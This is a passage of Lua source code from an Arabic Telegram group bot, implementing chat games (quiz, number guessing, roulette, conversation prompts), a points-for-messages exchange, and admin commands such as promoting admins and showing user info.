Dev_AIAN(msg.chat_id_, msg.id_, 1,WAAD, 1, 'md')
return false
end end
if text == DevAIAN:get(WAAD..'AIAN:GameNum7'..msg.chat_id_) then
if not DevAIAN:get(WAAD..'AIAN:Games:Ids'..msg.chat_id_) then 
DevAIAN:incrby(WAAD..'AIAN:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
DevAIAN:del(WAAD..'AIAN:GameNum7'..msg.chat_id_)
WAAD = '⌯︙مبروك لقد ربحت في اللعبه \n⌯︙ارسل ↫ انكليزيه للعب مره اخرى'
Dev_AIAN(msg.chat_id_, msg.id_, 1,WAAD, 1, 'md')
end
DevAIAN:set(WAAD..'AIAN:Games:Ids'..msg.chat_id_,true)
end  
--     Source WAAD     --
if text == 'اسئله' and ChCheck(msg) or text == 'اختيارات' and ChCheck(msg) or text == 'الاسئله' and ChCheck(msg) or text == 'اساله' and ChCheck(msg) then
if not DevAIAN:get(WAAD..'AIAN:Lock:Games'..msg.chat_id_) then
DevAIAN2 = {'النيل','14','الفم','11','30','بوتين','ستيف جوبر','باريس','10','النمل','حرف الواو','الشعر','سحاب','الاسم','ذهب','حرف الام','العزائم','انسات','المنجنيق','اسيا','6','الاسد','مهر','الدولفين','اوروبا','الزئبق','لندن','الانسان','طوكيو','خديجه',}
name = DevAIAN2[math.random(#DevAIAN2)]
DevAIAN:set(WAAD..'AIAN:GameNum8'..msg.chat_id_,name)
DevAIAN:del(WAAD..'AIAN:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'النيل','⌯︙ماهو اطول نهر في العالم ؟\n1- النيل\n2- الفرات\n3- نهر الكونغو')
name = string.gsub(name,'14','⌯︙ماعدد عظام الوجه ؟\n1- 15\n2- 13\n3- 14')
name = string.gsub(name,'الفم','⌯︙كراسي بيضاء وجدران ورديه اذا اغلقته اصبح ظلام  فمن اكون ؟\n1- الفم\n2- الاذن\n3- الثلاجه')
name = string.gsub(name,'11','⌯︙كم جزء يحتوي مسلسل وادي الذئاب ؟\n1- 7\n2- 15\n3- 11')
name = string.gsub(name,'30','⌯︙كم جزء يحتوي القران الكريم ؟\n1- 60\n2- 70\n3- 30')
name = string.gsub(name,'بوتين','⌯︙من هوه اغنى رئيس في العالم ؟\n1- ترامب\n2- اوباما\n3- بوتين')
name = string.gsub(name,'ستيف جوبر','⌯︙من هوه مؤسس شركه ابل العالميه  ؟\n1- لاري بايج\n2- بيل جيتس\n3- ستيف جوبر')
name = string.gsub(name,'باريس','ماهي عاصمه فرنسا ؟\n1- باريس\n2- لوين\n3- موسكو')
name = string.gsub(name,'10','⌯︙ماعدد دول العربيه التي توجد في افريقيا ؟\n1- 10\n2- 17\n3- 9')
name = string.gsub(name,'النمل','⌯︙ماهو الحيوان الذي يحمل 50 فوق وزنه ؟\n1- الفيل\n2- النمل\n3- الثور')
name = string.gsub(name,'حرف الواو','⌯︙ماذا يوجد بيني وبينك ؟\n1- الضل\n2- الاخلاق\n3- حرف الواو')
name = string.gsub(name,'الشعر','⌯︙ماهو الشيء النبات ينبت للانسان بلا بذر ؟\n1- الاضافر\n2- الاسنان\n3- الشعر')
name = string.gsub(name,'سحاب','⌯︙ما هو الشّيء الذي يستطيع المشي بدون أرجل والبكاء بدون أعين ؟\n1- سحاب\n2- بئر\n3- نهر')
name = string.gsub(name,'الاسم','⌯︙ما الشيء الذي نمتلكه , لكنّ غيرنا يستعمله أكثر منّا ؟\n1- العمر\n2- ساعه\n3- الاسم')
name = string.gsub(name,'ذهب','⌯︙اصفر اللون سارق عقول اهل الكون وحارمهم لذيذ النوم ؟\n1- نحاس\n2- الماس\n3- ذهب')
name = string.gsub(name,'حرف الام','⌯︙في الليل ثلاثة لكنه في النهار واحده فما هو ؟\n1- حرف الباء\n2- حرف الام\n3- حرف الراء')
name = string.gsub(name,'العزائم','⌯︙على قدر اصل العزم تأتي ؟\n1- العزائم\n2- المكارم\n3- المبائب')
name = string.gsub(name,'انسات','⌯︙ماهي جمع كلمه انسه ؟\n1- سيدات\n2- انسات\n3- قوانص')
name = string.gsub(name,'المنجنيق','⌯︙اله اتسعلمت قديما في الحروب ؟\n1- الصاروخ\n2- المسدس\n3- المنجنيق')
name = string.gsub(name,'اسيا','⌯︙تقع لبنان في قاره ؟\n1- افريقيا\n2- اسيا\n3- امركيا الشماليه')
name = string.gsub(name,'6','⌯︙كم صفرا للمليون ؟\n1- 4\n2- 3\n3- 6')
name = string.gsub(name,'الاسد','⌯︙ماهو الحيوان الذي يلقب بملك الغابه ؟\n1- الفيل\n2- الاسد\n3- النمر')
name = string.gsub(name,'مهر','⌯︙ما اسم صغير الحصان ؟\n1- مهر\n2- جرو\n3- عجل')
name = string.gsub(name,'الدولفين','⌯︙ما الحيوان الذي ينام واحدى عينه مفتوحه ؟\n1- القرش\n2- الدولفين\n3- الثعلب\n')
name = string.gsub(name,'اوروبا','⌯︙ماهي القاره التي تلقب بالقاره العجوز ؟\n1- اوروبا\n2- امريكا الشماليه\n3- افريقيا')
name = string.gsub(name,'الزئبق','⌯︙ما اسم المعدن الموجود فيي الحاله السائله ؟\n1- النحاس\n2- الحديد\n3- الزئبق')
name = string.gsub(name,'لندن','⌯︙ماهي عاصمه انجلترا ؟\n1- لندن\n2- لفرسول\n3- تركيا')
name = string.gsub(name,'الانسان','⌯︙ماهو الشئ الذي برأسه سبع فتحات ؟\n1- الهاتف\n2- التلفاز\n3- الانسان')
name = string.gsub(name,'طوكيو','⌯︙ماهي عاصمه اليابان ؟\n1- بانكول\n2- نيو دلهي\n3- طوكيو')
name = string.gsub(name,'خديجه','⌯︙من هي زوجه الرسول الاكبر منه سنآ ؟\n1- حفضه\n2- زينب\n3- خديجه')
WAAD = name..'\n⌯︙ارسل الجواب الصحيح فقط'
Dev_AIAN(msg.chat_id_, msg.id_, 1,WAAD, 1, 'md')
return false
end end
if text == DevAIAN:get(WAAD..'AIAN:GameNum8'..msg.chat_id_) then
if not DevAIAN:get(WAAD..'AIAN:Games:Ids'..msg.chat_id_) then 
DevAIAN:incrby(WAAD..'AIAN:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
DevAIAN:del(WAAD..'AIAN:GameNum8'..msg.chat_id_)
WAAD = '⌯︙مبروك لقد ربحت في اللعبه \n⌯︙ارسل ↫ الاسئله للعب مره اخرى'
Dev_AIAN(msg.chat_id_, msg.id_, 1,WAAD, 1, 'md')
end
DevAIAN:set(WAAD..'AIAN:Games:Ids'..msg.chat_id_,true)
end  
--     Source WAAD     --
if DevAIAN:get(WAAD.."GAME:TKMEN"..msg.chat_id_.."" .. msg.sender_user_id_) then  
if text and text:match("^(%d+)$") then
local NUM = text:match("^(%d+)$")
if tonumber(NUM) > 20 then
Dev_AIAN(msg.chat_id_, msg.id_, 1,"⌯︙عذرا لا يمكنك تخمين عدد اكبر من الـ20 خمن رقم ما بين الـ1 والـ20", 1, 'md')
return false  end 
local GETNUM = DevAIAN:get(WAAD.."GAMES:NUM"..msg.chat_id_)
if tonumber(NUM) == tonumber(GETNUM) then
DevAIAN:del(WAAD..'Set:Num'..msg.chat_id_..msg.sender_user_id_)
DevAIAN:del(WAAD.."GAME:TKMEN"..msg.chat_id_.."" .. msg.sender_user_id_)   
DevAIAN:incrby(WAAD..'AIAN:GamesNumber'..msg.chat_id_..msg.sender_user_id_,5)  
Dev_AIAN(msg.chat_id_, msg.id_, 1,'⌯︙*التخمين الصحيح هو* ↫ '..NUM..'\n⌯︙*مبروك لقد ربحت وحصلت على 5 نقاط يمكنك استبدالها بالرسائل*', 1, 'md')
elseif tonumber(NUM) ~= tonumber(GETNUM) then
DevAIAN:incrby(WAAD..'Set:Num'..msg.chat_id_..msg.sender_user_id_,1)
if tonumber(DevAIAN:get(WAAD..'Set:Num'..msg.chat_id_..msg.sender_user_id_)) >= 3 then
DevAIAN:del(WAAD..'Set:Num'..msg.chat_id_..msg.sender_user_id_)
DevAIAN:del(WAAD.."GAME:TKMEN"..msg.chat_id_.."" .. msg.sender_user_id_)   
Dev_AIAN(msg.chat_id_, msg.id_, 1,'⌯︙*التخمين الصحيح هو* ↫ '..GETNUM..'\n⌯︙*للاسف لقد خسرت حاول مره اخرى لتخمين الرقم الصحيح*', 1, 'md')
else
if tonumber(DevAIAN:get(WAAD..'Set:Num'..msg.chat_id_..msg.sender_user_id_)) == 1 then
SetNum = 'محاولتان فقط'
elseif tonumber(DevAIAN:get(WAAD..'Set:Num'..msg.chat_id_..msg.sender_user_id_)) == 2 then
SetNum = 'محاوله واحده فقط'
end
Dev_AIAN(msg.chat_id_, msg.id_, 1,'⌯︙لقد خمنت الرقم الخطا وتبقى لديك '..SetNum..' ارسل رقم تخمنه مره اخرى للفوز', 1, 'md')
end
end
end
end
if text == 'خمن' and ChCheck(msg) or text == 'تخمين' and ChCheck(msg) then   
if not DevAIAN:get(WAAD..'AIAN:Lock:Games'..msg.chat_id_) then
Num = math.random(1,20)
DevAIAN:set(WAAD.."GAMES:NUM"..msg.chat_id_,Num) 
Dev_AIAN(msg.chat_id_, msg.id_, 1,'⌯︙اهلا بك عزيزي في لعبة التخمين ↫ ⤈\n ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ\n⌯︙سيتم تخمين عدد ما بين الـ1 والـ20 اذا تعتقد انك تستطيع الفوز جرب واللعب الان .\n⌯︙ملاحظه لديك ثلاث محاولات فقط فكر قبل ارسال تخمينك !', 1, 'md')
DevAIAN:setex(WAAD.."GAME:TKMEN"..msg.chat_id_.."" .. msg.sender_user_id_, 100, true)  
return false  
end
end
--     Source WAAD     --
if text == 'روليت' then
if not DevAIAN:get(WAAD..'AIAN:Lock:Games'..msg.chat_id_) then
DevAIAN:del(WAAD.."AIAN:NumRolet"..msg.chat_id_..msg.sender_user_id_) 
DevAIAN:del(WAAD..'AIAN:ListRolet'..msg.chat_id_)  
DevAIAN:setex(WAAD.."AIAN:StartRolet"..msg.chat_id_..msg.sender_user_id_,3600,true)  
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙حسنا لنلعب , ارسل عدد اللاعبين للروليت .', 1, 'md')
return false  
end
end
if text and text:match("^(%d+)$") and DevAIAN:get(WAAD.."AIAN:StartRolet"..msg.chat_id_..msg.sender_user_id_) then
if text == "1" then
Text = "⌯︙لا استطيع بدء اللعبه بلاعب واحد فقط"
else
DevAIAN:set(WAAD.."AIAN:NumRolet"..msg.chat_id_..msg.sender_user_id_,text)  
Text = '⌯︙تم بدء تسجيل اللسته يرجى ارسال المعرفات \n⌯︙الفائز يحصل على 5 نقاط عدد المطلوبين ↫ '..text..' لاعب'
end
DevAIAN:del(WAAD.."AIAN:StartRolet"..msg.chat_id_..msg.sender_user_id_)
send(msg.chat_id_,msg.id_,Text)
return false
end
if text and text:match('^(@[%a%d_]+)$') and DevAIAN:get(WAAD.."AIAN:NumRolet"..msg.chat_id_..msg.sender_user_id_) then 
if DevAIAN:sismember(WAAD..'AIAN:ListRolet'..msg.chat_id_,text) then
send(msg.chat_id_,msg.id_,'⌯︙المعرف ↫ ['..text..'] موجود اساسا')
return false
end
tdcli_function ({ID = "SearchPublicChat",username_ = text},function(extra, res, success) 
if res and res.message_ and res.message_ == "USERNAME_NOT_OCCUPIED" then 
Dev_AIAN(msg.chat_id_, msg.id_, 1,'⌯︙المعرف غير صحيح يرجى ارسال معرف صحيح', 1, 'md')
return false 
end
DevAIAN:sadd(WAAD..'AIAN:ListRolet'..msg.chat_id_,text)
local CountAdd = DevAIAN:get(WAAD.."AIAN:NumRolet"..msg.chat_id_..msg.sender_user_id_)
local CountAll = DevAIAN:scard(WAAD..'AIAN:ListRolet'..msg.chat_id_)
local CountUser = CountAdd - CountAll
if tonumber(CountAll) == tonumber(CountAdd) then 
DevAIAN:del(WAAD.."AIAN:NumRolet"..msg.chat_id_..msg.sender_user_id_) 
DevAIAN:setex(WAAD.."AIAN:WittingStartRolet"..msg.chat_id_..msg.sender_user_id_,1400,true) 
local Text = "⌯︙تم ادخال المعرف ↫ ["..text.."]\n⌯︙وتم اكتمال العدد الكلي هل انت مستعد ؟"
keyboard = {} 
keyboard.inline_keyboard = {{{text="نعم",callback_data="/YesRolet"},{text="لا",callback_data="/NoRolet"}},{{text="اللاعبين",callback_data="/ListRolet"}}} 
Msg_id = msg.id_/2097152/0.5
return https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end 
local Text = "⌯︙تم ادخال المعرف ↫ ["..text.."] وتبقى ↫ "..CountUser.." لاعبين ليكتمل العدد ارسل المعرف الاخر"
keyboard = {} 
keyboard.inline_keyboard = {{{text="الغاء",callback_data="/NoRolet"}}} 
Msg_id = msg.id_/2097152/0.5
return https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end,nil) 
end
--     Source WAAD     --
if text == 'كت تويت' and ChCheck(msg) or text == 'كت' and ChCheck(msg) then
if not DevAIAN:get(WAAD..'AIAN:Lock:Games'..msg.chat_id_) then
local WAAD = {
'آخر مرة زرت مدينة الملاهي؟','آخر مرة أكلت أكلتك المفضّلة؟','الوضع الحالي؟\n‏1. سهران\n‏2. ضايج\n‏3. أتأمل','آخر شيء ضاع منك؟','كلمة أخيرة لشاغل البال؟','طريقتك المعتادة في التخلّص من الطاقة السلبية؟','شهر من أشهر العام له ذكرى جميلة معك؟','كلمة غريبة من لهجتك ومعناها؟🤓','‏- شيء سمعته عالق في ذهنك هاليومين؟','متى تكره الشخص الذي أمامك حتى لو كنت مِن أشد معجبينه؟','‏- أبرز صفة حسنة في صديقك المقرب؟','هل تشعر أن هنالك مَن يُحبك؟','اذا اكتشفت أن أعز أصدقائك يضمر لك السوء، موقفك الصريح؟','أجمل شيء حصل معك خلال هاليوم؟','صِف شعورك وأنت تُحب شخص يُحب غيرك؟👀💔','كلمة لشخص غالي اشتقت إليه؟💕','آخر خبر سعيد، متى وصلك؟','أنا آسف على ....؟','أوصف نفسك بكلمة؟','صريح، مشتاق؟','‏- صريح، هل سبق وخذلت أحدهم ولو عن غير قصد؟','‏- ماذا ستختار من الكلمات لتعبر لنا عن حياتك التي عشتها الى الآن؟💭','‏- فنان/ة تود لو يدعوكَ على مائدة عشاء؟😁❤','‏- تخيّل شيء قد يحدث في المستقبل؟','‏- للشباب | آخر مرة وصلك غزل من فتاة؟🌚','شخص أو صاحب عوضك ونساك مُر الحياة ما اسمه ؟','| اذا شفت حد واعجبك وعندك الجرأه انك تروح وتتعرف عليه ، مقدمة الحديث شو راح تكون ؟.','كم مره تسبح باليوم','نسبة النعاس عندك حاليًا؟','لو فقط مسموح شخص واحد تتابعه فالسناب مين بيكون ؟','يهمك ملابسك تكون ماركة ؟','وش الشيء الي تطلع حرتك فيه و زعلت ؟','عندك أخوان او خوات من الرضاعة؟','عندك معجبين ولا محد درا عنك؟',
'أطول مدة قضيتها بعيد عن أهلك ؟','لو يجي عيد ميلادك تتوقع يجيك هدية؟','يبان عليك الحزن من " صوتك - ملامحك','وين تشوف نفسك بعد سنتين؟','وش يقولون لك لما تغني ؟','عندك حس فكاهي ولا نفسية؟','كيف تتصرف مع الشخص الفضولي ؟','كيف هي أحوال قلبك؟','حاجة تشوف نفسك مبدع فيها ؟','متى حبيت؟','شيء كل م تذكرته تبتسم ...','العلاقه السريه دايماً تكون حلوه؟','صوت مغني م تحبه','لو يجي عيد ميلادك تتوقع يجيك هدية؟','اذا احد سألك عن شيء م تعرفه تقول م اعرف ولا تتفلسف ؟','مع او ضد : النوم افضل حل لـ مشاكل الحياة؟','مساحة فارغة (..............) اكتب اي شيء تبين','اغرب اسم مر عليك ؟','عمرك كلمت فويس احد غير جنسك؟','اذا غلطت وعرفت انك غلطان تحب تعترف ولا تجحد؟','لو عندك فلوس وش السيارة اللي بتشتريها؟','وش اغبى شيء سويته ؟','شيء من صغرك ماتغير فيك؟','وش نوع الأفلام اللي تحب تتابعه؟','وش نوع الأفلام اللي تحب تتابعه؟','تجامل احد على حساب مصلحتك ؟','تتقبل النصيحة من اي شخص؟','كلمه ماسكه معك الفترة هذي ؟','متى لازم تقول لا ؟','اكثر شيء تحس انه مات ف مجتمعنا؟','تؤمن ان في "حُب من أول نظرة" ولا لا ؟.','تؤمن ان في "حُب من أول نظرة" ولا لا ؟.','هل تعتقد أن هنالك من يراقبك بشغف؟','اشياء اذا سويتها لشخص تدل على انك تحبه كثير ؟','اشياء صعب تتقبلها بسرعه ؟','اقتباس لطيف؟','أكثر جملة أثرت بك في حياتك؟','عندك فوبيا من شيء ؟.',
'اكثر لونين تحبهم مع بعض؟','أجمل بيت شعر سمعته ...','سبق وراودك شعور أنك لم تعد تعرف نفسك؟','تتوقع فيه احد حاقد عليك ويكرهك ؟','أجمل سنة ميلادية مرت عليك ؟','لو فزعت/ي لصديق/ه وقالك مالك دخل وش بتسوي/ين؟','وش تحس انك تحتاج الفترة هاذي ؟','يومك ضاع على؟','@منشن .. شخص تخاف منه اذا عصب ...','فيلم عالق في ذهنك لا تنساه مِن روعته؟','تختار أن تكون غبي أو قبيح؟','الفلوس او الحب ؟','أجمل بلد في قارة آسيا بنظرك؟','ما الذي يشغل بالك في الفترة الحالية؟','احقر الناس هو من ...','وين نلقى السعاده برايك؟','اشياء تفتخر انك م سويتها ؟','تزعلك الدنيا ويرضيك ؟','وش الحب بنظرك؟','افضل هديه ممكن تناسبك؟','كم في حسابك البنكي ؟','كلمة لشخص أسعدك رغم حزنك في يومٍ من الأيام ؟','عمرك انتقمت من أحد ؟!','ما السيء في هذه الحياة ؟','غنية عندك معاها ذكريات🎵🎻','/','أفضل صفة تحبه بنفسك؟','اكثر وقت تحب تنام فيه ...','أطول مدة نمت فيها كم ساعة؟','أصعب قرار ممكن تتخذه ؟','أفضل صفة تحبه بنفسك؟','اكثر وقت تحب تنام فيه ...','أنت محبوب بين الناس؟ ولاكريه؟','إحساسك في هاللحظة؟','اخر شيء اكلته ؟','تشوف الغيره انانيه او حب؟','اذكر موقف ماتنساه بعمرك؟','اكثر مشاكلك بسبب ؟','اول ماتصحى من النوم مين تكلمه؟','آخر مرة ضحكت من كل قلبك؟','لو الجنسية حسب ملامحك وش بتكون جنسيتك؟','اكثر شيء يرفع ضغطك','اذكر موقف ماتنساه بعمرك؟','لو قالوا لك  تناول صنف واحد فقط من الطعام لمدة شهر .',
'كيف تشوف الجيل ذا؟','ردة فعلك لو مزح معك شخص م تعرفه ؟','احقر الناس هو من ...','تحب ابوك ولا امك','آخر فيلم مسلسل والتقييم🎥؟','أقبح القبحين في العلاقة: الغدر أو الإهمال🤷🏼؟','كلمة لأقرب شخص لقلبك🤍؟','حط@منشن لشخص وقوله "حركتك مالها داعي"😼!','اذا جاك خبر مفرح اول واحد تعلمه فيه مين💃🏽؟','طبع يمكن يخليك تكره شخص حتى لو كنت تُحبه🙅🏻‍♀️؟','افضل ايام الاسبوع عندك🔖؟','يقولون ان الحياة دروس ، ماهو أقوى درس تعلمته من الحياة🏙؟','تاريخ لن تنساه📅؟','تحب الصيف والا الشتاء❄️☀️؟','شخص تحب تستفزه😈؟','شنو ينادونك وانت صغير (عيارتك)👼🏻؟','عقل يفهمك/ج ولا قلب يحبك/ج❤️؟','اول سفره لك وين رح تكون✈️؟','كم عدد اللي معطيهم بلوك👹؟','نوعية من الأشخاص تتجنبهم في حياتك❌؟','شاركنا صورة او فيديو من تصويرك؟📸','كم من عشره تعطي حظك📩؟','اكثر برنامج تواصل اجتماعي تحبه😎؟','من اي دوله انت🌍؟','اكثر دوله ودك تسافر لها🏞؟','مقولة "نكبر وننسى" هل تؤمن بصحتها🧓🏼؟','تعتقد فيه أحد يراقبك👩🏼‍💻؟','لو بيدك تغير الزمن ، تقدمه ولا ترجعه🕰؟','مشروبك المفضل🍹؟','‏قم بلصق آخر اقتباس نسخته؟💭','كم وزنك/ج طولك/ج؟🌚','كم كان عمرك/ج قبل ٨ سنين😈؟','دوله ندمت انك سافرت لها😁؟','لو قالو لك ٣ أمنيات راح تتحقق عالسريع شنو تكون🧞‍♀️؟','‏- نسبة احتياجك للعزلة من 10📊؟','شخص تحبه حظرك بدون سبب واضح، ردة فعلك🧐؟','مبدأ في الحياة تعتمد عليه دائما🕯؟'
}  
Dev_AIAN(msg.chat_id_, msg.id_, 1, ''..WAAD[math.random(#WAAD)]..'' , 1, 'md')  
return false
end
end
--     Source WAAD     --
if text and (text == 'الالعاب' or text == 'العاب' or text == 'اللعبه') and ChCheck(msg) then
if not DevAIAN:get(WAAD..'AIAN:Lock:Games'..msg.chat_id_) then
Dev_AIAN(msg.chat_id_, msg.id_, 1,[[
⌯︙قائمة العاب المجموعه ↫ ⤈
ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ
⌯︙لعبة التخمين ↫ خمن
⌯︙لعبة الامثله ↫ امثله
⌯︙لعبة العكس ↫ العكس
⌯︙لعبة الاسئله ↫ اسئله
⌯︙لعبة الروليت ↫ روليت
⌯︙لعبة الحزوره ↫ حزوره
⌯︙لعبة الترتيب ↫ ترتيب
⌯︙لعبة المعاني ↫ معاني
⌯︙لعبة التويت ↫ كت تويت
⌯︙لعبة المختلف ↫ المختلف
⌯︙لعبة السمايلات ↫ سمايلات
⌯︙لعبة المحيبس ↫ المحيبس
⌯︙لعبة الرياضيات ↫ رياضيات
⌯︙لعبة الانكليزيه ↫ انكليزيه
ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ
⌯︙نقاطي • بيع نقاطي
ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ
[🖥┇𝐒𝐎𝐔𝐑𝐂𝐄 𝐃𝐑𝐀𝐆𝐎𝐍 .](t.me/CXRCX)➤
]], 1, 'md')
else
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙عذرا الالعاب معطله في المجموعه', 1, 'md')
end
end
if text == "الالعاب المتطوره" or text == "الالعاب الاحترافيه" or text == "↫ الالعاب المتطوره ᥀" then
if not DevAIAN:get(WAAD..'AIAN:Lock:Gamesinline'..msg.chat_id_) then
Text =[[
*⌯︙قائمه الالعاب المتطوره اضغط للعب*
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text="♟ الشطرنج ♟",url='https://t.me/T4TTTTBOT?game=chess'}},
{{text="لعبة فلابي بيرد 🐥",url='https://t.me/awesomebot?game=FlappyBird'},{text="تحدي الرياضيات",url='https://t.me/gamebot?game=MathBattle'}},
{{text="اكس او",url='t.me/xobot?start'},{text="سباق الدراجات 🏍",url='https://t.me/gamee?game=MotoFX'}},
{{text="سباق سيارات 🏎",url='https://t.me/gamee?game=F1Racer'},{text="متشابه 👾",url='https://t.me/gamee?game=DiamondRows'}},
{{text="كرة قدم ⚽",url='https://t.me/gamee?game=FootballStar'}},
{{text="ورق🤹‍♂",url='https://t.me/gamee?game=Hexonix'},{text="Hexonix❌",url='https://t.me/gamee?game=Hexonix'}},
{{text="MotoFx🏍️",url='https://t.me/gamee?game=MotoFx'}},
{{text="لعبة 2048 🎰",url='https://t.me/awesomebot?game=g2048'},{text="Squares🏁",url='https://t.me/gamee?game=Squares'}},
{{text="Atomic 1▶️",url='https://t.me/gamee?game=AtomicDrop1'},{text="Corsairs",url='https://t.me/gamebot?game=Corsairs'}},
{{text="LumberJack",url='https://t.me/gamebot?game=LumberJack'}},
{{text="LittlePlane",url='https://t.me/gamee?game=LittlePlane'},{text="RollerDisco",url='https://t.me/gamee?game=RollerDisco'}},
{{text="🦖 لعبة التنين 🦖",url='https://t.me/T4TTTTBOT?game=WAAD'},{text="🐍 لعبة الافعى 🐍",url='https://t.me/T4TTTTBOT?game=snake'}},
{{text="🔵 لعبة الالوان 🔴",url='https://t.me/T4TTTTBOT?game=color'}},
{{text="🚀 لعبة الصاروخ 🚀",url='https://t.me/T4TTTTBOT?game=rocket'},{text="🏹 لعبة السهام 🏹",url='https://t.me/T4TTTTBOT?game=arrow'}},
{{text="لعبة النينجا",url='https://t.me/gamee?game=GravityNinja21'},{text="لعبة الكرتي",url='https://t.me/gamee?game=KarateKid2'}},
{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/CXRCX"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
end end
--     Source WAAD     --
if text == 'بيع نقاطي' and ChCheck(msg) then
if tonumber((DevAIAN:get(WAAD..'AIAN:GamesNumber'..msg.chat_id_..msg.sender_user_id_) or 0)) == 0 then
Dev_AIAN(msg.chat_id_, msg.id_, 1,'⌯︙لم تربح اي نقطه\n⌯︙ارسل ↫ الالعاب للعب', 1, 'md')
else
DevAIAN0 = (DevAIAN:get(WAAD..'AIAN:GamesNumber'..msg.chat_id_..msg.sender_user_id_) * 50)
DevAIAN:incrby(WAAD..'AIAN:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_,DevAIAN0)
Dev_AIAN(msg.chat_id_, msg.id_, 1,'⌯︙تم بيع '..(DevAIAN:get(WAAD..'AIAN:GamesNumber'..msg.chat_id_..msg.sender_user_id_))..' من نقاطك\n⌯︙كل نقطه تساوي 50 رساله', 'md')
DevAIAN:del(WAAD..'AIAN:GamesNumber'..msg.chat_id_..msg.sender_user_id_)
end
end
--     Source WAAD     --
if text == 'رفع المشرفين' and ChCheck(msg) or text == 'رفع الادمنيه' and ChCheck(msg) then  
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 200},function(arg,SoOoFi) 
local num = 0
local admins = SoOoFi.members_  
for i=0 , #admins do   
if SoOoFi.members_[i].bot_info_ == false and SoOoFi.members_[i].status_.ID == "ChatMemberStatusEditor" then
DevAIAN:sadd(WAAD..'AIAN:Admins:'..msg.chat_id_, admins[i].user_id_)   
num = num + 1
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,dp) 
if dp.first_name_ == false then
DevAIAN:srem(WAAD..'AIAN:Admins:'..msg.chat_id_, admins[i].user_id_)   
end
end,nil)   
else
DevAIAN:srem(WAAD..'AIAN:Admins:'..msg.chat_id_, admins[i].user_id_)   
end 
if SoOoFi.members_[i].status_.ID == "ChatMemberStatusCreator" then  
Manager_id = admins[i].user_id_  
DevAIAN:sadd(WAAD..'AIAN:BasicConstructor:'..msg.chat_id_,Manager_id)  
DevAIAN:sadd(WAAD..'AIAN:AIANConstructor:'..msg.chat_id_,Manager_id)   
end  
end  
if num == 0 then
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙لا يوجد ادمنيه ليتم رفعهم\n⌯︙تم رفع مالك المجموعه", 1, 'md')
else
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙تم رفع '..num..' من الادمنيه \n⌯︙تم رفع مالك المجموعه', 1, 'md')
end
end,nil) 
end
--     Source WAAD     --
if text == 'غادر' and SudoBot(msg) then
if DevAIAN:get(WAAD.."AIAN:Left:Bot"..WAAD) and not SecondSudo(msg) then
Dev_AIAN(msg.chat_id_,msg.id_, 1, "⌯︙المغادره معطله من قبل المطور الاساسي", 1, 'md')
return false  
end
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙تم مغادرة المجموعه \n⌯︙تم حذف جميع بياناتها ', 1, 'md')
ChatLeave(msg.chat_id_, WAAD)
DevAIAN:srem(WAAD.."AIAN:Groups",msg.chat_id_)
end
--     Source WAAD     --
if text ==('موقعي') and ChCheck(msg) then
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,da) 
if da.status_.ID == "ChatMemberStatusCreator" then
rtpa = 'المنشئ'
elseif da.status_.ID == "ChatMemberStatusEditor" then
rtpa = 'الادمن'
elseif da.status_.ID == "ChatMemberStatusMember" then
rtpa = 'عضو'
end
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙موقعك ↫ '..rtpa, 1, 'md')
end,nil)
end
--     Source WAAD     --
if text == "معلوماتي" and ChCheck(msg) then
function get_me(extra,result,success)
local msguser = tonumber(DevAIAN:get(WAAD..'AIAN:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_))
local user_msgs = DevAIAN:get(WAAD..'AIAN:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
local cont = (tonumber(DevAIAN:get(WAAD..'AIAN:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)) or 0)
local user_nkt = tonumber(DevAIAN:get(WAAD..'AIAN:GamesNumber'..msg.chat_id_..msg.sender_user_id_) or 0)
if result.username_ then username = '@'..result.username_ else username = 'لا يوجد' end
if result.last_name_ then lastname = result.last_name_ else lastname = '' end
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙اسمك ↫ ❨ ['..result.first_name_..'] ❩\n⌯︙معرفك ↫ ❨ ['..username..'] ❩\n⌯︙ايديك ↫ ❨ `'..result.id_..'` ❩\n⌯︙نقاطك ↫ ❨ '..user_nkt..' ❩\n⌯︙رسائلك ↫ ❨ '..user_msgs..' ❩\n⌯︙جهاتك ↫ ❨ '..cont..' ❩\n⌯︙تفاعلك ↫ '..formsgs(msguser)..'\n⌯︙رتبتك ↫ '..IdRank(msg.sender_user_id_, msg.chat_id_), 1, 'md')
end
